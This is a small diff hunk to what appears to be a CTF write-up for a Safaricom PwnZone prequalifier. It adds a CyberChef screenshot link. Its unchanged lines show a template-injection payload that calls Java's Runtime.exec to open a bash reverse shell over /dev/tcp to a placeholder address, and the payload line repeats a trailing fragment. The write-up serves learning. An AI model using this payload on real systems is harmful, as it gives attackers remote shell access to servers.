@@ -151,6 +151,8 @@ Final Payload Structure (Template Evaluation)
 ```
 ${script:javascript:java.lang.Runtime.getRuntime().exec(Java.to(['/bin/bash','-c','sh -i >& /dev/tcp/your_ip_address/your_port 0>&1'],'java.lang.String[]'))} "your_port 0>&1'],'java.lang.String[]'))} "
 ```
+![CyberChef Encoding](/dzif8ltvg/image/upload/v1759707892/CTF/Safaricom%20PwnZone%20CTF%20Prequalifiers/cyber_chef_uevfk8.png)
+
 Note: This specific structure utilizes a scripting engine within the templating context (like JNDI/OGNL) to execute.
 
 
